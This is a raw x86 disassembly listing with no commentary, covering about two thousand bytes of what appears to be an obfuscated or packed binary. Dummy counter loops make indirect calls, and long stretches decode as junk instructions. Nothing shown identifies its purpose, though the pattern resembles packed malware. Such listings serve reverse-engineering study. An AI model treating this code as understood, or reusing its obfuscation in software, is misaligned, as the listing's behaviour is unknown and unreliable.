  406173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406174:	add    eax,0xf7f2c243
  406179:	mov    bh,0x3c
  40617b:	pop    esi
  40617c:	mov    cl,0xbb
  40617e:	mov    eax,0x69581e10
  406183:	pop    es
  406184:	sub    BYTE PTR [ecx+eax*1-0x23],bh
  406188:	sub    esp,DWORD PTR [ecx]
  40618a:	jge    0x406130
  40618c:	sub    dl,0x19
  40618f:	inc    esp
  406190:	loop   0x406144
  406192:	push   eax
  406193:	mov    ch,0x53
  406195:	jmp    0x40715f
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4235c3,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4235d3,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4235d7,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx-0x52646ce8],0xffffff86
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x4063ec
  4063d4:	dec    ebp
  4063d5:	xor    cl,ah
  4063d7:	jg     0x4063b2
  4063d9:	push   esp
  4063da:	(bad)  
  4063db:	aad    0xd6
  4063dd:	scas   eax,DWORD PTR es:[edi]
  4063de:	inc    edx
  4063df:	sbb    esp,DWORD PTR [edi-0x7bb10967]
  4063e5:	xor    al,0xf4
  4063e7:	cmp    ecx,ebp
  4063e9:	shr    esp,0xfa
  4063ec:	cmp    esi,DWORD PTR [ebx-0x6da0a163]
  4063f2:	imul   esp,DWORD PTR ds:0xcbcad648,0xe2f4c69a
  4063fc:	sub    edi,DWORD PTR [esi]
  4063fe:	adc    al,0xa8
  406400:	ds dec ebx
  406402:	dec    ebp
  406403:	push   ebp
  406404:	cdq    
  406405:	mov    ch,0x19
  406407:	mov    ah,0x34
  406409:	fsub   DWORD PTR [eax]
  40640b:	mov    ecx,0xff4d97f4
  406410:	lods   al,BYTE PTR ds:[esi]
  406411:	jmp    0x9f60a114
  406416:	mov    eax,0x13b217da
  40641b:	mov    ebx,0xe97e21ce
  406420:	mov    esi,0xd070e9c1
  406425:	ins    DWORD PTR es:[edi],dx
  406426:	into   
  406427:	mov    DWORD PTR [ecx+0x1a],esi
  40642a:	add    bh,BYTE PTR [esi]
  40642c:	mov    ds:0x45c63768,al
  406431:	xchg   DWORD PTR [ecx],esp
  406433:	cwde   
  406434:	sub    BYTE PTR [edi],ch
  406436:	inc    esp
  406437:	dec    edi
  406438:	cmp    ch,BYTE PTR [eax]
  40643a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40643b:	or     BYTE PTR [ebp-0x1a],ch
  40643e:	sub    bl,BYTE PTR [esi]
  406440:	js     0x406456
  406442:	jb     0x4063d4
  406444:	scas   al,BYTE PTR es:[edi]
  406445:	retf   0xe93b
  406448:	push   ebp
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	and    eax,0xf0443986
  40644f:	pop    ebp
  406450:	clc    
  406451:	aas    
  406452:	das    
  406453:	push   esi
  406454:	int3   
  406455:	stos   BYTE PTR es:[edi],al
  406456:	cmp    al,BYTE PTR [esp+edi*8+0x69]
  40645a:	jl     0x4064b0
  40645c:	pop    edi
  40645d:	jmp    0x4064c7
  40645f:	xchg   edi,eax
  406460:	add    al,BYTE PTR [ecx-0x25]
  406463:	pop    ecx
  406464:	aad    0x54
  406466:	push   0xffffffc7
  406468:	or     esi,edx
  40646a:	call   DWORD PTR [eax+0x5a]
  40646d:	mov    ebx,0xd055dd56
  406472:	xor    al,0xb6
  406474:	inc    esi
  406475:	push   cs
  406476:	lods   eax,DWORD PTR ds:[esi]
  406477:	dec    eax
  406478:	outs   dx,BYTE PTR ds:[esi]
  406479:	xchg   BYTE PTR [esi+0x7adaf413],bl
  40647f:	xchg   edi,eax
  406480:	in     al,0x0
  406482:	sub    edi,esp
  406484:	das    
  406485:	or     eax,0x7471e21c
  40648a:	(bad)  
  40648b:	xchg   esi,eax
  40648c:	pusha  
  40648d:	mov    ds:0x75e31237,eax
  406492:	int    0xc2
  406494:	leave  
  406495:	dec    edx
  406496:	fist   WORD PTR [edx+0x67c566a8]
  40649c:	mov    eax,ds:0x50f67975
  4064a1:	(bad)  
  4064a2:	fiadd  WORD PTR [ecx+0x190a57d2]
  4064a8:	cmp    al,0x13
  4064aa:	fcom   QWORD PTR [ebp-0x5ce23441]
  4064b0:	mov    ds:0xf3275469,eax
  4064b5:	adc    ebp,ecx
  4064b7:	dec    eax
  4064b8:	mov    ebx,0xc1b4181a
  4064bd:	mov    WORD PTR ds:0x23a8456c,?
  4064c3:	sbb    eax,0xf3a6a137
  4064c8:	retf   
  4064c9:	ror    BYTE PTR [esp+eiz*4+0x453f9dc7],1
  4064d0:	imul   ebp,DWORD PTR [edx],0x28
  4064d3:	cmp    ecx,DWORD PTR ds:0xbc62f12e
  4064d9:	mov    eax,0x28c25364
  4064de:	xor    esi,esi
  4064e0:	mov    ah,0x67
  4064e2:	push   eax
  4064e3:	add    BYTE PTR [edx+ebx*8-0x2e],dh
  4064e7:	sub    eax,0x92b1926
  4064ec:	(bad)  
  4064ed:	xlat   BYTE PTR ds:[ebx]
  4064ee:	lods   al,BYTE PTR ds:[esi]
  4064ef:	pop    ebp
  4064f0:	sbb    esi,edi
  4064f2:	jg     0x406511
  4064f4:	xor    al,0x5b
  4064f6:	or     al,0x69
  4064f8:	mov    WORD PTR [esi+0x57481585],ss
  4064fe:	push   eax
  4064ff:	cld    
  406500:	add    BYTE PTR [edx],dh
  406502:	sub    ebp,DWORD PTR [edi]
  406504:	ja     0x406489
  406506:	or     eax,0x3f83332
  40650b:	stc    
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0xd1994057,edi
  406527:	mov    bl,0xfe
  406529:	lahf   
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	adc    eax,0x5c202dbf
  406536:	mov    dl,0x7f
  406538:	in     al,dx
  406539:	jno    0x4064fb
  40653b:	(bad)  
  40653c:	jbe    0x406522
  40653e:	mov    ah,0x4b
  406540:	neg    DWORD PTR [esi+0x1bd7e52]
  406546:	mov    ds:0xda0a8230,eax
  40654b:	xor    al,0x98
  40654d:	jnp    0x4065a0
  40654f:	cmp    al,0x52
  406551:	scas   eax,DWORD PTR es:[edi]
  406552:	and    esp,DWORD PTR [ecx+edi*1+0x22]
  406556:	xchg   bl,bh
  406558:	pop    ebp
  406559:	mov    bl,0x69
  40655b:	pusha  
  40655c:	(bad)  
  40655d:	fldenv [esi]
  40655f:	retf   0x2c9f
  406562:	hlt    
  406563:	and    bl,BYTE PTR [ebx-0x6a2dee51]
  406569:	xor    DWORD PTR [edx-0x2716d0aa],ebx
  40656f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406570:	cld    
  406571:	test   BYTE PTR [ebx+0x67502e8b],bl
  406577:	sub    esp,0x64
  40657a:	div    edx
  40657c:	and    eax,0x6f1ea868
  406581:	pusha  
  406582:	mov    ch,0x3f
  406584:	dec    ebp
  406585:	mov    edi,esi
  406587:	aaa    
  406588:	pushf  
  406589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40658a:	bound  ebx,QWORD PTR [ebx]
  40658c:	adc    ch,BYTE PTR [ebx-0x6b06c140]
  406592:	std    
  406593:	cmp    al,0x83
  406595:	dec    ebx
  406596:	int3   
  406597:	cmp    edx,DWORD PTR [ebp-0x4a]
  40659a:	or     eax,0x26a09fea
  40659f:	jmp    0xcff5c282
  4065a4:	xor    eax,0x87024460
  4065a9:	push   ebx
  4065aa:	jle    0x4065ea
  4065ac:	inc    edi
  4065ad:	adc    BYTE PTR [ebp-0x5d59742e],bl
  4065b3:	pop    ebp
  4065b4:	mov    bh,0x4f
  4065b6:	imul   ecx,DWORD PTR [esi],0x48
  4065b9:	cs repz test eax,0x7b99fd13
  4065c0:	(bad)  
  4065c2:	push   0xffffffcf
  4065c4:	push   eax
  4065c5:	shl    eax,1
  4065c7:	arpl   WORD PTR [ebx],bx
  4065c9:	xchg   esi,eax
  4065ca:	xlat   BYTE PTR ds:[ebx]
  4065cb:	xchg   ebx,eax
  4065cc:	test   al,0x55
  4065ce:	aaa    
  4065cf:	bnd jnp 0x4065c6
  4065d2:	cmp    ch,BYTE PTR [esi]
  4065d4:	(bad)  [eax+0x4c]
  4065d7:	fwait
  4065d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d9:	out    0xa1,eax
  4065db:	cmp    DWORD PTR [ebp+0x7d],0x6e4c6100
  4065e2:	and    eax,0x4a2073ac
  4065e7:	dec    di
  4065e9:	fnstsw WORD PTR [ecx+0x11536596]
  4065ef:	pushf  
  4065f0:	push   0x652640b
  4065f5:	mov    ds:0xa709816d,al
  4065fa:	jl     0x406654
  4065fc:	lea    ebp,[ecx-0x7a]
  4065ff:	lea    edx,[ebp-0x42]
  406602:	push   0xebcc5d77
  406607:	mov    eax,DWORD PTR [ebx+0x4a]
  40660a:	mov    es:0xdce1117d,eax
  406610:	sub    al,0xce
  406612:	mov    esp,0x118b2cf5
  406617:	inc    ecx
  406618:	jno    0x40668d
  40661a:	mov    esi,ebx
  40661c:	loopne 0x406669
  40661e:	xor    DWORD PTR cs:[edx],edx
  406621:	sbb    ebp,DWORD PTR [ebx-0x42f72457]
  406627:	mov    eax,DWORD PTR [ecx+0x6f]
  40662a:	sbb    bh,cl
  40662c:	lods   eax,DWORD PTR ds:[esi]
  40662d:	in     al,0xd3
  40662f:	es ds jae 0x406638
  406633:	xchg   edi,eax
  406634:	push   ebx
  406635:	push   edx
  406636:	or     esi,ebx
  406638:	push   0xffffffa3
  40663a:	push   ebx
  40663b:	fsubr  st(3),st
  40663d:	dec    ecx
  40663e:	xchg   ebp,eax
  40663f:	mov    edi,0x278a5c33
  406644:	fild   WORD PTR [eax+ebp*1-0x6b6a9047]
  40664b:	dec    BYTE PTR ds:0x34014706
  406651:	push   edi
  406652:	ss das 
  406654:	addr16 dec ebp
  406656:	mov    al,ds:0xb54cc1a4
  40665b:	mov    esi,0x881d6fd9
  406660:	sti    
  406661:	shl    BYTE PTR [edi],0x84
  406664:	mov    ch,0x94
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	ret    0x8adc
  40674b:	mov    al,ds:0x7e7e0240
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x406751
  406755:	test   BYTE PTR [ecx],dl
  406757:	fld    st(0)
  406759:	cmp    BYTE PTR ds:0x65c1a07b,bl
  40675f:	or     eax,0x8e127c67
  406764:	or     eax,0xd5142da
  406769:	(bad)  
  40676a:	and    BYTE PTR [ebp+0x1],ch
  40676d:	sahf   
  40676e:	jmp    0x40672b
  406770:	mov    dl,0x61
  406772:	rcl    BYTE PTR [ebx],0x2b
  406775:	xchg   ebp,eax
  406776:	mov    ah,0xed
  406778:	aas    
  406779:	cmp    dh,BYTE PTR [edi]
  40677b:	push   ebp
  40677c:	test   eax,0x511e6c8b
  406781:	outs   dx,DWORD PTR ds:[esi]
  406782:	test   DWORD PTR [ebx+0x57954756],edx
  406788:	std    
  406789:	nop
  40678a:	jo     0x4067c8
  40678c:	test   DWORD PTR [ecx],ebp
  40678e:	adc    bh,0xa1
  406791:	jo     0x4067b2
  406793:	dec    ebx
  406794:	pushf  
  406795:	mov    ecx,0xc502f3af
  40679a:	popa   
  40679b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40679c:	stos   DWORD PTR es:[edi],eax
  40679d:	cmc    
  40679e:	fidivr WORD PTR [ebp+edx*4-0x2b21b471]
  4067a5:	dec    edi
  4067a6:	aam    0xe1
  4067a8:	cdq    
  4067a9:	lea    ecx,[edx]
  4067ab:	or     al,0x2d
  4067ad:	add    BYTE PTR [eax+0x13],ch
  4067b0:	in     eax,0xbd
  4067b2:	sub    al,0xb8
  4067b4:	xor    al,0xde
  4067b6:	scas   eax,DWORD PTR es:[edi]
  4067b7:	mov    ds:0xa3d2da31,eax
  4067bc:	and    BYTE PTR [eax+0x45cb7fa8],bh
  4067c2:	adc    esp,esp
  4067c4:	pop    ecx
  4067c5:	pop    eax
  4067c6:	xlat   BYTE PTR ds:[ebx]
  4067c7:	ja     0x406827
  4067c9:	sub    DWORD PTR [eax],ebx
  4067cb:	mov    bh,0xa0
  4067cd:	cmp    bl,BYTE PTR [ecx+0x4ec0054f]
  4067d3:	sub    ecx,DWORD PTR [esp+esi*1+0x37d3e53f]
  4067da:	mov    eax,ds:0xafe3ea0
  4067df:	or     BYTE PTR [ebx-0x3266323d],dl
  4067e5:	les    eax,FWORD PTR [edi]
  4067e7:	in     eax,dx
  4067e8:	jl     0x40683d
  4067ea:	dec    edi
  4067eb:	cmp    eax,0x895978f9
  4067f0:	je     0x40677e
  4067f2:	adc    DWORD PTR [esi-0x6be4d718],0x72
  4067f9:	jae    0x406841
  4067fb:	sub    BYTE PTR [ebp+0x56b87e94],ch
  406801:	sbb    esi,DWORD PTR [edi+0x15]
  406804:	mov    esi,0x109b944c
  406809:	and    al,BYTE PTR [ebp+ecx*2+0x1f8d0873]
  406810:	ins    DWORD PTR es:[edi],dx
  406811:	mov    bl,0xd9
  406813:	push   0x8bd803d3
  406818:	test   BYTE PTR [eax+0x6a4cb2df],dh
  40681e:	stc    
  40681f:	sub    ebx,esp
  406821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406822:	cmp    ebp,DWORD PTR [edx-0x35]
  406825:	outs   dx,BYTE PTR ds:[esi]
  406826:	stc    
  406827:	popa   
  406828:	or     dh,BYTE PTR [edx+eax*4]
  40682b:	cmp    eax,0x69a5ed89
  406830:	ins    DWORD PTR es:[edi],dx
  406831:	out    dx,al
  406832:	mov    esp,0xbbf4b795
  406837:	and    dh,dh
  406839:	and    ah,al
  40683b:	cmc    
  40683c:	jl     0x406888
  40683e:	pop    es
  40683f:	jecxz  0x406819
  406841:	mov    BYTE PTR [ecx-0x69a91e07],ah
  406847:	jbe    0x406815
  406849:	sbb    BYTE PTR [esi+0x70c0041a],ch
  40684f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406850:	ja     0x406899
  406852:	outs   dx,DWORD PTR ds:[esi]
  406853:	(bad)  
  406854:	cld    
  406855:	pop    eax
  406856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406857:	xchg   edi,eax
  406858:	mov    cs,WORD PTR [esi-0x42]
  40685b:	mov    esi,DWORD PTR [ebx-0x80]
  40685e:	mov    bh,0x54
  406860:	ret    
  406861:	push   ebx
  406862:	rcr    DWORD PTR [eax-0x1d2a226d],1
  406868:	std    
  406869:	sti    
  40686a:	jl     0x4068e4
  40686c:	mov    WORD PTR [edx],ds
  40686e:	and    eax,0xda69b02a
  406873:	and    DWORD PTR [esi+0x1bfbd33f],edi
  406879:	jne    0x406804
  40687b:	pop    edx
  40687c:	mov    edx,0x3af5f947
  406881:	push   ebp
  406882:	pop    ds
  406883:	mov    ah,0x72
  406885:	lock sub esi,ecx
  406888:	out    0x3,al
  40688a:	push   ebp
  40688b:	rol    bh,0x45
  40688e:	call   0xf8dcedcb
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0x63
  4068b9:	xor    ebp,DWORD PTR [edx]
  4068bb:	sub    DWORD PTR [ebp+0x0],esi
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x406878
  4068c5:	rcr    bl,0xd6
  4068c8:	push   es
  4068c9:	je     0x406929
  4068cb:	mov    ch,BYTE PTR cs:[esi+0x6d]
  4068cf:	mov    ah,0x79
  4068d1:	or     DWORD PTR [edi-0x44334e8],edx
  4068d7:	int3   
  4068d8:	push   cs
  4068d9:	dec    edx
  4068da:	dec    edx
  4068db:	sub    dl,BYTE PTR [esi]
  4068dd:	pop    esi
  4068de:	ret    
  4068df:	mov    esp,esi
  4068e1:	cmc    
  4068e2:	push   ebx
  4068e3:	lock (bad) 
  4068e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068e6:	sub    al,0x24
  4068e8:	add    BYTE PTR [esi-0x4d0768aa],cl
  4068ee:	dec    ecx
  4068ef:	adc    ch,BYTE PTR [edi-0x31e6096e]
  4068f5:	pop    edx
  4068f6:	or     al,0x77
  4068f8:	enter  0x140e,0x90
  4068fc:	loopne 0x406891
  4068fe:	sbb    ebx,DWORD PTR [ecx]
  406900:	and    eax,0x23f39d15
  406905:	sub    al,0x5
  406907:	sbb    BYTE PTR [eax],0x80
  40690a:	icebp  
  40690b:	cmp    al,0x3
  40690d:	outs   dx,BYTE PTR ds:[esi]
  40690e:	ins    BYTE PTR es:[edi],dx
  40690f:	xor    BYTE PTR [edi-0x71e705b2],bl
  406915:	ins    BYTE PTR es:[edi],dx
  406916:	arpl   dx,di
  406918:	imul   esi,DWORD PTR [eax+ecx*2+0x57],0xf0a7a10f
  406920:	mov    eax,ds:0x92eee6b5
  406925:	dec    esp
  406926:	arpl   WORD PTR [edi],sp
  406928:	dec    ebx
  406929:	or     eax,0xb24a1223
  40692e:	fisubr WORD PTR [ecx]
  406930:	cli    
  406931:	push   edi
  406932:	sahf   
  406933:	jmp    0x3bc3:0x5cc7304e
  40693a:	(bad)  
  40693b:	mov    bl,0x73
  40693d:	and    al,0x8a
  40693f:	fidiv  DWORD PTR [esp+ecx*2]
  406942:	int3   
  406943:	pop    esp
  406944:	mov    edi,DWORD PTR [ebp-0x6c]
  406947:	mov    edx,0xbbc55e6d
  40694c:	jl     0x40697b
  40694e:	mov    eax,ds:0xbe388283
  406953:	gs ins BYTE PTR es:[edi],dx
  406955:	jnp    0x406999
  406957:	pusha  
  406958:	gs jne 0x4069b3
  40695b:	call   0xc3a6:0x90e8dc7a
  406962:	daa    
  406963:	adc    eax,0x260453e4
  406968:	aas    
  406969:	lods   eax,DWORD PTR ds:[esi]
  40696a:	xor    eax,0x28759106
  40696f:	jns    0x4069ad
  406971:	add    dl,BYTE PTR [eax]
  406973:	(bad)
  406976:	out    dx,al
  406977:	jle    0x4069cf
  406979:	jmp    0x4c93d0dd
  40697e:	sub    bh,BYTE PTR [ebx+0x3389f883]
  406984:	mov    al,ds:0x925cdc
  406989:	push   cs
  40698a:	pop    edi
  40698b:	push   cs
  40698c:	mov    ah,0x9e
  40698f:	es ret 0x1a00
  406993:	out    0xd4,al
  406995:	xchg   ebp,eax
  406996:	push   cs
  406997:	ss hlt 
  406999:	scas   eax,DWORD PTR es:[edi]
  40699a:	into   
  40699b:	outs   dx,BYTE PTR ds:[esi]
  40699c:	push   ebx
  40699d:	sbb    BYTE PTR [ebx+0x165d5011],bh
  4069a3:	xor    edi,DWORD PTR fs:[ecx+0x60]
  4069a7:	ins    DWORD PTR es:[edi],dx
  4069a8:	jno    0x406946
  4069aa:	scas   al,BYTE PTR es:[edi]
  4069ab:	xchg   ebx,eax
  4069ac:	call   0x4289fbd8
  4069b1:	sub    bh,BYTE PTR [edx+ebx*2+0x25]
  4069b5:	push   edi
  4069b6:	aaa    
  4069b7:	ret    0xd34
  4069ba:	into   
  4069bb:	call   0xe6e89c93
  4069c0:	inc    esi
  4069c1:	jbe    0x406965
  4069c3:	jp     0x40696a
  4069c5:	push   edx
  4069c6:	in     al,dx
  4069c7:	out    0x93,al
  4069c9:	inc    ebp
  4069ca:	rcl    DWORD PTR [ecx+0x30],0x1a
  4069ce:	(bad)  [edx+0x63]
  4069d1:	dec    esp
  4069d2:	es mov cl,0x5d
  4069d5:	push   ecx
  4069d6:	lods   al,BYTE PTR ds:[esi]
  4069d7:	jb     0x40698f
  4069d9:	es sub al,0xb8
  4069dc:	out    0x7d,al
  4069de:	pop    edx
  4069df:	das    
  4069e0:	cdq    
  4069e1:	fldenv [ecx+0x5a]
  4069e4:	jmp    0x406967
  4069e6:	call   0x3c7d87b8
  4069eb:	int3   
  4069ec:	add    al,0x7f
  4069ee:	imul   ebp,DWORD PTR [edx-0x3716b1a4],0xdb96ecdf
  4069f8:	xchg   ebx,eax
  4069f9:	xor    edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x73dc7a93
  406a0e:	loopne 0x406a6c
  406a10:	add    DWORD PTR ds:[esi+0x7e],edi
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x406a39
  406a19:	cmp    eax,0xfaf8b45d
  406a1e:	or     BYTE PTR [ebp+0x2a46a793],dh
  406a24:	sbb    al,0x13
  406a26:	repz push cs
  406a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a29:	push   esp
  406a2a:	call   0x7175:0x6cb33bd5
  406a31:	jne    0x406aa6
  406a33:	sub    bl,dh
  406a35:	js     0x406a6a
  406a37:	push   esi
  406a38:	ss sub al,0x46
  406a3b:	jae    0x4069f0
  406a3d:	fistp  DWORD PTR [eax+edx*1-0x36fb02ad]
  406a44:	dec    eax
  406a45:	and    eax,0xa98b86d3
  406a4a:	into   
  406a4b:	mov    esi,0x9412c3ee
  406a50:	das    
  406a51:	xor    ecx,DWORD PTR [esp+esi*1-0x18]
  406a55:	adc    DWORD PTR [ecx-0x740660d1],ebp
  406a5b:	pushf  
  406a5c:	test   BYTE PTR [ecx+0x78],0x50
  406a60:	cmp    DWORD PTR [ebx+eiz*4+0x4a],esp
  406a64:	das    
  406a65:	ret    0xd539
  406a68:	jge    0x406a8b
